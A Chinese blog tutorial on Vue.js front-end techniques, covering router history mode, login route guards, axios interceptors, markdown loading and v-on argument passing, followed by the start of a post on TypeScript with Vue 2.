<p>下面这一代码片段是使用 <code>vue-cli</code> 下载的模板写法, 但是这种写法会使你的 URL 变成 <code>http://localhost:8080/#/</code></p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> Router <span>from</span> <span>"vue-router"</span><span>;</span>
<span>// ... ...</span>

Vue<span>.</span><span>use</span><span>(</span>Router<span>)</span><span>;</span>

<span>export</span> <span>default</span> <span>new</span> <span>Router</span><span>(</span><span>{</span>
  <span>routes</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>path</span><span>:</span> <span>"/"</span><span>,</span>
      <span>// ... ...</span>
    <span>}</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>对于强迫症的人来说, 这样的 URL 非常丑, 这就需要开启 <code>HTML5 History</code> 模式, 更具体的说明请看官方文档 <a href="https://router.vuejs.org/zh-cn/essentials/history-mode.html" target="_blank" rel="noopener noreferrer">vue-router HTML5 History 模式</a></p>
<h4 id="router-index-js" tabindex="-1"> router/index.js</h4>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> Router <span>from</span> <span>"vue-router"</span><span>;</span>
<span>// ... ...</span>

Vue<span>.</span><span>use</span><span>(</span>Router<span>)</span><span>;</span>

<span>const</span> router <span>=</span> <span>new</span> <span>VueRouter</span><span>(</span><span>{</span>
  <span>mode</span><span>:</span> <span>"history"</span><span>,</span>
  <span>routes</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>path</span><span>:</span> <span>"/"</span><span>,</span>
      <span>// ... ...</span>
    <span>}</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>export</span> <span>default</span> router<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="路由拦截" tabindex="-1"> 路由拦截</h3>
<p>对于进入某些页面需要进行登录验证, 那么就需要设置路由拦截, <code>vue-router</code> 官方文档称之为导航钩子, 具体请看官方文档 <a href="https://router.vuejs.org/zh-cn/advanced/navigation-guards.html" target="_blank" rel="noopener noreferrer">vue-router 导航钩子</a></p>
<p>实际上在进行路由拦截时需要进行数据验证, 当验证通过时方能允许其通过该路由, 该验证数据通常会存储在 <code>vuex</code> 的 <code>state</code> 中, 或者会存储在 <code>Local Storage</code> , 再或者 <code>Session Storage</code> , 无论存储在哪里, <code>vue-router</code> 配置文件能够正确访问到即可, 当然验证程序就需要后端服务 API 提供了</p>
<h4 id="router-index-js-1" tabindex="-1"> router/index.js</h4>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> Router <span>from</span> <span>"vue-router"</span><span>;</span>
<span>import</span> store <span>from</span> <span>"@/store"</span><span>;</span>
<span>// ... ...</span>

Vue<span>.</span><span>use</span><span>(</span>Router<span>)</span><span>;</span>

<span>const</span> router <span>=</span> <span>new</span> <span>VueRouter</span><span>(</span><span>{</span>
  <span>mode</span><span>:</span> <span>"history"</span><span>,</span>
  <span>routes</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>path</span><span>:</span> <span>"/"</span><span>,</span>
      <span>// ... ...</span>
      <span>meta</span><span>:</span> <span>{</span>
        <span>requireAuth</span><span>:</span> <span>true</span><span>,</span> <span>// 添加该字段,表示进入这个路由是需要进行验证的</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

router<span>.</span><span>beforeEach</span><span>(</span><span>(</span><span>to<span>,</span> from<span>,</span> next</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>to<span>.</span>matched<span>.</span><span>some</span><span>(</span><span>(</span><span>r</span><span>)</span> <span>=></span> r<span>.</span>meta<span>.</span>requireAuth<span>)</span><span>)</span> <span>{</span>
    <span>// 判断该路由是否需要登录权限</span>
    <span>if</span> <span>(</span>store<span>.</span>state<span>.</span>token<span>)</span> <span>{</span>
      <span>// 通过 vuex state 获取当前的 token 是否存在</span>
      <span>next</span><span>(</span><span>)</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>next</span><span>(</span><span>{</span>
        <span>path</span><span>:</span> <span>"/login"</span><span>,</span> <span>// 验证失败,将会跳转到该路由</span>
        <span>query</span><span>:</span> <span>{</span>
          <span>redirect</span><span>:</span> to<span>.</span>fullPath<span>,</span>
        <span>}</span><span>,</span> <span>// 将跳转的路由 path 作为参数,登录成功后跳转到该路由</span>
      <span>}</span><span>)</span><span>;</span>
    <span>}</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>next</span><span>(</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span><span>)</span><span>;</span>

<span>export</span> <span>default</span> router<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="axios" tabindex="-1"> axios</h2>
<p>自从 Vue.js 更新至 2.x 版本之后, 官方就不再使用 <code>vue-resource</code> , 替而代之的是 <a href="https://github.com/mzabriskie/axios" target="_blank" rel="noopener noreferrer">axios</a></p>
<h3 id="目录结构-4" tabindex="-1"> 目录结构</h3>
<div><pre><code><span>|</span>-- src
  <span>|</span>-- axios
    <span>|</span>-- index.js
  <span>|</span>-- pages
    <span>|</span>-- Home.vue
  <span>|</span>-- main.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="src-main-js-3" tabindex="-1"> src/main.js</h4>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> App <span>from</span> <span>"./App"</span><span>;</span>

<span>import</span> api <span>from</span> <span>"./axios"</span><span>;</span>
<span>Vue</span><span>.</span>prototype<span>.</span>$api <span>=</span> api<span>;</span>

Vue<span>.</span>config<span>.</span>productionTip <span>=</span> <span>false</span><span>;</span>

<span>/* eslint-disable no-new */</span>
<span>new</span> <span>Vue</span><span>(</span><span>{</span>
  <span>el</span><span>:</span> <span>"#app"</span><span>,</span>
  <span>template</span><span>:</span> <span>"&lt;App/>"</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    App<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="axios-拦截" tabindex="-1"> axios 拦截</h3>
<p>使用 vue-router 进行路由拦截是不够的, 当然也是需要数据验证的, 更加详细的说明以及例子请移步 <a href="https://segmentfault.com/a/1190000008383094?_ea=1639495" target="_blank" rel="noopener noreferrer">【vue+axios】一个项目学会前端实现登录拦截</a></p>
<h4 id="axios-index-js" tabindex="-1"> axios/index.js</h4>
<div><pre><code><span>import</span> axios <span>from</span> <span>"axios"</span><span>;</span>
<span>import</span> store <span>from</span> <span>"../store"</span><span>;</span>
<span>import</span> router <span>from</span> <span>"../router"</span><span>;</span>

<span>// 设置全局axios默认值</span>
axios<span>.</span>defaults<span>.</span>timeout <span>=</span> <span>5000</span><span>;</span> <span>// 5000的超时验证</span>
axios<span>.</span>defaults<span>.</span>headers<span>.</span>post<span>[</span><span>"Content-Type"</span><span>]</span> <span>=</span> <span>"application/jsoncharset=UTF-8"</span><span>;</span>

<span>// 创建一个axios实例</span>
<span>const</span> instance <span>=</span> axios<span>.</span><span>create</span><span>(</span><span>)</span><span>;</span>
instance<span>.</span>defaults<span>.</span>headers<span>.</span>post<span>[</span><span>"Content-Type"</span><span>]</span> <span>=</span>
  <span>"application/jsoncharset=UTF-8"</span><span>;</span>

axios<span>.</span>interceptors<span>.</span>request<span>.</span>use <span>=</span> instance<span>.</span>interceptors<span>.</span>request<span>.</span>use<span>;</span>

<span>// http request 拦截器</span>
instance<span>.</span>interceptors<span>.</span>request<span>.</span><span>use</span><span>(</span>
  <span>(</span><span>config</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>store<span>.</span>state<span>.</span>token<span>)</span> <span>{</span>
      config<span>.</span>headers<span>.</span>Authorization <span>=</span> <span><span>`</span><span>token </span><span><span>${</span>store<span>.</span>state<span>.</span>token<span>}</span></span><span>`</span></span><span>.</span><span>replace</span><span>(</span>
        <span><span>/</span><span>(^")|("$)</span><span>/</span><span>g</span></span><span>,</span>
        <span>""</span>
      <span>)</span><span>;</span>
    <span>}</span>
    <span>return</span> config<span>;</span>
  <span>}</span><span>,</span>
  <span>(</span><span>error</span><span>)</span> <span>=></span> <span>{</span>
    <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>error<span>)</span><span>;</span>
  <span>}</span>
<span>)</span><span>;</span>

<span>// http response 拦截器</span>
instance<span>.</span>interceptors<span>.</span>response<span>.</span><span>use</span><span>(</span>
  <span>(</span><span>response</span><span>)</span> <span>=></span> <span>{</span>
    <span>return</span> response<span>;</span>
  <span>}</span><span>,</span>
  <span>(</span><span>error</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>error<span>.</span>response<span>)</span> <span>{</span>
      <span>switch</span> <span>(</span>error<span>.</span>response<span>.</span>status<span>)</span> <span>{</span>
        <span>case</span> <span>401</span><span>:</span>
          store<span>.</span><span>dispatch</span><span>(</span><span>"UserLogout"</span><span>)</span><span>;</span>
          router<span>.</span><span>replace</span><span>(</span><span>{</span>
            <span>path</span><span>:</span> <span>"login"</span><span>,</span>
            <span>query</span><span>:</span> <span>{</span>
              <span>redirect</span><span>:</span> router<span>.</span>currentRoute<span>.</span>fullPath<span>,</span>
            <span>}</span><span>,</span>
          <span>}</span><span>)</span><span>;</span>
      <span>}</span>
    <span>}</span>
    <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>error<span>.</span>response<span>)</span><span>;</span>
  <span>}</span>
<span>)</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>// POST</span>
  <span>PostData</span><span>(</span><span>data</span><span>)</span> <span>{</span>
    <span>return</span> instance<span>.</span><span>post</span><span>(</span><span>"/api/postData"</span><span>,</span> data<span>)</span><span>;</span>
  <span>}</span><span>,</span>
  <span>// GET</span>
  <span>GetData</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> instance<span>.</span><span>get</span><span>(</span><span>"/api/user/getData"</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="在-vue-组件内调用" tabindex="-1"> 在 Vue 组件内调用</h3>
<h4 id="src-pages-home-vue-1" tabindex="-1"> src/pages/Home.vue</h4>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span>&lt;!-- ... ... --></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>export</span> <span>default</span> <span>{</span>
      <span>name</span><span>:</span> <span>'Home'</span><span>,</span>
      <span>data</span><span>:</span> <span>{</span>
          <span>return</span> <span>{</span>
              <span>fromData</span><span>:</span> <span>[</span>
                  <span>// ... ...</span>
              <span>]</span>
          <span>}</span>
      <span>}</span><span>,</span>
      <span>methods</span><span>:</span> <span>{</span>
          <span>post</span><span>(</span><span>)</span> <span>{</span>
              <span>const</span> opt <span>=</span> <span>this</span><span>.</span>fromData
              <span>this</span><span>.</span>$api<span>.</span><span>PostData</span><span>(</span>opt<span>)</span>
                  <span>.</span><span>then</span><span>(</span><span>(</span><span><span>{</span>
                      data
                  <span>}</span></span><span>)</span> <span>=></span> <span>{</span>
                      <span>// ... ...</span>
                  <span>}</span><span>)</span>
                  <span>.</span><span>catch</span><span>(</span><span>(</span><span>err</span><span>)</span> <span>=></span> <span>{</span>
                      console<span>.</span><span>log</span><span>(</span>err<span>)</span>
                  <span>}</span><span>)</span>
          <span>}</span>
      <span>}</span>
      <span>created</span><span>(</span><span>)</span> <span>{</span>
          <span>this</span><span>.</span>$api<span>.</span><span>GetData</span><span>(</span><span>)</span>
              <span>.</span><span>then</span><span>(</span><span>(</span><span><span>{</span>
                  data
              <span>}</span></span><span>)</span> <span>=></span> <span>{</span>
                  <span>// ... ...</span>
              <span>}</span><span>)</span>
              <span>.</span><span>catch</span><span>(</span><span>(</span><span>err</span><span>)</span> <span>=></span> <span>{</span>
                  console<span>.</span><span>log</span><span>(</span>err<span>)</span>
              <span>}</span><span>)</span>
      <span>}</span>
  <span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="规范性" tabindex="-1"> 规范性</h2>
<blockquote>
<p>这里只举例 <code>.vue</code> 文件 script 模块中, 各个函数的书写顺序, 更多的规范性请查询文档 <a href="http://cn.vuejs.org/v2/style-guide/" target="_blank" rel="noopener noreferrer">风格指南</a></p>
</blockquote>
<div><pre><code><span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>""</span><span>,</span> <span>// 组件名字</span>
  <span>props</span><span>:</span> <span>[</span>
    <span>// 继承父组件数据</span>
    <span>""</span><span>,</span>
  <span>]</span><span>,</span>

  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>// 该组件数据</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
  <span>watch</span><span>:</span> <span>{</span>
    <span>// 于观察 Vue 实例上的数据变动。对应一个对象,键是观察表达式,值是对应回调。值也可以是方法名,或者是对象,包含选项</span>
  <span>}</span><span>,</span>
  <span>computed</span><span>:</span> <span>{</span>
    <span>// 相当于属性的一个实时计算,如果实时计算里关联了对象,那么当对象的某个值改变的时候,同事会出发实时计算</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>// 该组件的方法</span>
  <span>}</span><span>,</span>
  <span>filter</span><span>:</span> <span>{</span>
    <span>// 过滤器</span>
  <span>}</span><span>,</span>
  <span>beforeRouteUpdate</span><span>(</span><span>to<span>,</span> from<span>,</span> next</span><span>)</span> <span>{</span>
    <span>// 在当前路由改变,但是该组件被复用时调用</span>
  <span>}</span><span>,</span>
  <span>created</span><span>(</span><span>)</span> <span>{</span>
    <span>// 在 vue 1.0 中起到初始化数据作用,在 vue 2.0 之后推荐改用 computed</span>
  <span>}</span><span>,</span>
  <span>mounted</span><span>(</span><span>)</span> <span>{</span>
    <span>// 在这发起后端请求,拿回数据,配合路由钩子做一些事情</span>
  <span>}</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    <span>// 组件</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="在-vue-中引入-markdown" tabindex="-1"> 在 vue 中引入 markdown</h2>
<h3 id="安装相关依赖" tabindex="-1"> 安装相关依赖</h3>
<div><pre><code><span>npm</span> i -D text-loader
<span>npm</span> i -S marked github-markdown-css
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="配置-webpack" tabindex="-1"> 配置 webpack</h2>
<p><code>build/webpack.base.conf.js</code></p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
    <span>module</span><span>:</span> <span>{</span>
        <span>rules</span><span>:</span> <span>[</span><span>{</span>
                <span>test</span><span>:</span> <span><span>/</span><span>.md$</span><span>/</span></span><span>,</span>
                <span>loader</span><span>:</span> <span>'text-loader'</span>
            <span>}</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>vue.config.js</code></p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>chainWebpack</span><span>:</span> <span>(</span><span>config</span><span>)</span> <span>=></span> <span>{</span>
    config<span>.</span>module
      <span>.</span><span>rule</span><span>(</span><span>"test"</span><span>)</span>
      <span>.</span><span>test</span><span>(</span><span><span>/</span><span>\.md$</span><span>/</span></span><span>)</span>
      <span>.</span><span>use</span><span>(</span><span>"test-loader"</span><span>)</span>
      <span>.</span><span>loader</span><span>(</span><span>"test-loader"</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="编写-vue-文件" tabindex="-1"> 编写 vue 文件</h3>
<div><pre><code><span><span><span>&lt;</span>template</span> <span>lang</span><span><span>=</span><span>"</span>html<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>article markdown-body<span>"</span></span> <span>v-html</span><span><span>=</span><span>"</span>compiledMarkdown<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>import</span> marked <span>from</span> <span>"marked"</span><span>;</span>
  <span>import</span> versionLog <span>from</span> <span>"./versionLog.md"</span><span>;</span>
  <span>import</span> <span>"github-markdown-css/github-markdown.css"</span><span>;</span>

  <span>export</span> <span>default</span> <span>{</span>
    <span>name</span><span>:</span> <span>"VersionLog"</span><span>,</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        <span>context</span><span>:</span> versionLog<span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
    <span>computed</span><span>:</span> <span>{</span>
      <span>compiledMarkdown</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>marked</span><span>(</span><span>this</span><span>.</span>context<span>,</span> <span>{</span>
          <span>sanitize</span><span>:</span> <span>true</span><span>,</span>
        <span>}</span><span>)</span><span>;</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="基于-markdown-的幻灯片" tabindex="-1"> 基于 Markdown 的幻灯片</h2>
<p>导入 <code>text-loader</code> 上一节已经说明过了, 这里就不重复了</p>
<blockquote>
<p><a href="https://github.com/Jinjiang/vue-mark-display" target="_blank" rel="noopener noreferrer">github vue-mark-display</a></p>
</blockquote>
<div><pre><code><span>npm</span> i vue-mark-display
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="usage" tabindex="-1"> usage</h3>
<p><code>demo.md</code></p>
<div><pre><code><span><span>#</span> Hello World</span>

<span>---</span>

This is Vue Mark Display
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p><code>demo.vue</code></p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>mark-display</span>
    <span>:markdown</span><span><span>=</span><span>"</span>markdown<span>"</span></span>
    <span>@title</span><span><span>=</span><span>"</span>setTitle<span>"</span></span>
    <span>keyboard-ctrl</span>
    <span>url-hash-ctrl</span>
    <span>auto-font-size</span>
    <span>auto-blank-target</span>
  <span>></span></span><span><span><span>&lt;/</span>mark-display</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>import</span> MarkDisplay <span>from</span> <span>"vue-mark-display"</span><span>;</span>
  <span>import</span> markdown <span>from</span> <span>"./demo.md"</span><span>;</span>

  <span>export</span> <span>default</span> <span>{</span>
    <span>components</span><span>:</span> <span>{</span>
      MarkDisplay<span>,</span>
    <span>}</span><span>,</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        markdown<span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
    <span>methods</span><span>:</span> <span>{</span>
      <span>setTitle</span><span>(</span><span><span>{</span> title <span>}</span></span><span>)</span> <span>{</span>
        document<span>.</span>title <span>=</span> title<span>;</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="关于父组件通过-v-on-接收子组件多个参数" tabindex="-1"> 关于父组件通过 v-on 接收子组件多个参数</h2>
<p>写组件的时候遇到一个需求, 我需要在子组件向父组件传递信息</p>
<div><pre><code><span>this</span><span>.</span><span>$emit</span><span>(</span><span>"myEvent"</span><span>,</span> 信息<span>1</span><span>,</span> 信息<span>2</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>在父组件使用 <code>v-on</code> 来接收</p>
<div><pre><code><span><span><span>&lt;</span>my-component</span> <span>@myEvent</span><span><span>=</span><span>"</span>handler<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>这样就可以接收到子组件传递的信息 1 和信息 2, easy。</p>
<div><pre><code><span>export</span> <span>default</span> <span>{</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>handler</span><span>(</span><span>param1<span>,</span> param2</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>param1<span>,</span> param2<span>)</span><span>;</span> <span>// => 信息1, 信息2</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>但我需要在内联语句中传递一个额外参数, 平时子组件只附带一个参数的时候, 可以使用 <code>$event</code></p>
<div><pre><code><span><span><span>&lt;</span>my-component</span> <span>@myEvent</span><span><span>=</span><span>"</span>handler(<span>'</span>extra parameter<span>'</span>, $event)<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>但是 $event 只接收第一个参数, 也就是这么写只能接收到信息 1</p>
<div><pre><code><span>export</span> <span>default</span> <span>{</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>handler</span><span>(</span><span>extra<span>,</span> param1<span>,</span> param2</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>extra<span>,</span> param1<span>,</span> param2<span>)</span><span>;</span> <span>// => 'extra parameter', 信息1, undefined</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>最后找到了一个解决办法</p>
<div><pre><code><span><span><span>&lt;</span>my-component</span>
  <span>@myEvent</span><span><span>=</span><span>"</span>handler(<span>'</span>extra parameter<span>'</span>, arguments[0], arguments[1])<span>"</span></span>
<span>/></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>可以获取到参数了</p>
<div><pre><code><span>export</span> <span>default</span> <span>{</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>handler</span><span>(</span><span>extra<span>,</span> param1<span>,</span> param2</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>extra<span>,</span> param1<span>,</span> param2<span>)</span><span>;</span> <span>// => 'extra parameter', 信息1, 信息2</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>因为实际上这里的 <code>$event</code> 就是 <code>arguments[0]</code>, 下面这一段现在的 vue 文档上好像已经找不到了, 但是 <code>arguments</code> 还是可以用的</p>
<p><img src="/assets/fit-vue-1.png" alt="fix-vue-1"></p>
<p>多提一句, 当 <code>v-on</code> 的参数是 <code>dom</code> 事件时, <code>$event</code> 代表的是原生的 <code>event</code> 事件</p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/fit-vue-1.png" type="image/png"/>
    </item>
    <item>
      <title>在 vue2.x 下使用 typescript</title>
      <link>https://vxhly.github.io/views/vuejs/in-vue2x-usage-typescript.html</link>
      <guid>https://vxhly.github.io/views/vuejs/in-vue2x-usage-typescript.html</guid>
      <source url="https://vxhly.github.io/rss.xml">在 vue2.x 下使用 typescript</source>
      <description>前言
今天我们来看看如何在 vue 项目中使用 ts,目前使用公司项目用的较多的还是 vue2.x,vue 是渐进式的框架, 我们学习也要渐进式的, 所以本文也先围绕 vue2.x 来对 Ts 进行实战, 为后期切换 vue3.0 打下基础。

</description>
      <category>vuejs</category>
      <pubDate>Tue, 18 May 2021 11:20:19 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>今天我们来看看如何在 vue 项目中使用 ts,目前使用公司项目用的较多的还是 vue2.x,vue 是渐进式的框架, 我们学习也要渐进式的, 所以本文也先围绕 vue2.x 来对 Ts 进行实战, 为后期切换 vue3.0 打下基础。</p>
</div>

<h2 id="简介" tabindex="-1"> 简介</h2>
<p>在使用前我们要先在项目中安装 Ts, 安装过程就不细说了, 如果只是学习, 推荐用 vue 的官方脚手架, 里面就带有安装 Ts 选项。接着要安装下 <code>vue-class-component</code> 和 <code>vue-property-decorator</code></p>
<p>安装之前我们先了解下 <code>vue-class-component</code> 和 <code>vue-property-decorator</code></p>
<p><code>vue-class-component</code> 是 vue 的官方库, 作用是以 class 的模式编写组件。这种编写方式使 vue 组件可以使用继承、混入等高级特性,更重要的是使 Vue 组件更好的跟 TS 结合使用。</p>
<p><code>vue-property-decorator</code> 是社区出的, 基于 <code>vue-class-component</code> 拓展出了很多操作符 @Prop @Emit @Inject 等;可以说是 <code>vue-class-component</code> 的一个超集, 使代码更为简洁明了, <code>options</code> 里面需要配置 <code>decorator</code> 库不支持的属性, 比如 <code>components</code>, <code>filters</code>, <code>directives</code> 等。</p>
<p>这两者都是离不开装饰器的, 装饰器已在 ES 提案中。<code>decorator</code> 是装饰器模式的实践。装饰器模式呢, 它是继承关系的一个替代方案。动态地给对象添加额外的职责。在不改变接口的前提下, 增强类的功能。</p>
<h2 id="使用" tabindex="-1"> 使用</h2>
<h3 id="component" tabindex="-1"> Component</h3>
<p>装饰器可以接收一个对象作为参数, 可以在对象中声明 <code>components</code> , <code>filters</code>, <code>directives</code> 等未提供装饰器的选项。</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>home<span>"</span></span><span>></span></span>
    {{ num | addOne("过滤器第二个参数") }}
    <span><span><span>&lt;</span>Test</span> <span>ref</span><span><span>=</span><span>"</span>helloWorld<span>"</span></span> <span>v-test</span><span><span>=</span><span>"</span><span>'</span>h<span>'</span><span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span> Component<span>,</span> Vue <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
<span>import</span> Test <span>from</span> <span>"@/components/Test.vue"</span><span>;</span>

@<span>Component</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"Home"</span><span>,</span>
  <span>//组件</span>
  <span>components</span><span>:</span> <span>{</span>
    Test<span>,</span>
  <span>}</span><span>,</span>

  <span>//局部指令</span>
  <span>directives</span><span>:</span> <span>{</span>
    <span>test</span><span>(</span><span><span>el</span><span>:</span> HTMLElement<span>,</span> binding</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>"DOW:"</span><span>,</span> el<span>,</span> <span>"局部指令:"</span><span>,</span> binding<span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>

